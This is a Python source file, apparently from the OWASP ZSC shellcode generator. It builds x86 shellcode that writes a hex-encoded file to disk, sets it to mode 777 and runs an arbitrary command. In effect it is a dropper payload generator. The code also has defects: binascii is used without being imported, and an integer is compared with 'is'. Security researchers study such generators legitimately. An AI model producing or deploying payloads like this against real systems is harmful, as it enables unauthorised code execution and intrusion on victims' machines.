#!/usr/bin/env python
'''
OWASP ZSC | ZCR Shellcoder

ZeroDay Cyber Research
Z3r0D4y.Com
Ali Razmjoo
shellcode template used : http://shell-storm.org/shellcode/files/shellcode-57.php
'''
import sys
from core import color
from core import stack
from core import template
def run(filename,content,command):
	command = command.replace('[space]',' ')
	try:
		cont = binascii.b2a_hex(open(content).read())
	except:
		from core import start
		sys.exit(color.color('red')+'Error, Cannot find/open the file %s'%(content)+color.color('reset'))
	l = len(cont) -1
	n = 0
	c = '\\x'
	for word in cont:
		c += word
		n+=1
		if n is 2:
			n = 0
			c += '\\x'
	c = c[:-2]
	command = 'echo -e "%s" > %s ; chmod 777 %s ; %s'%(str(c),str(filename),str(filename),str(command))
	return template.sys(stack.generate(command.replace('[space]',' '),'%ecx','string'))
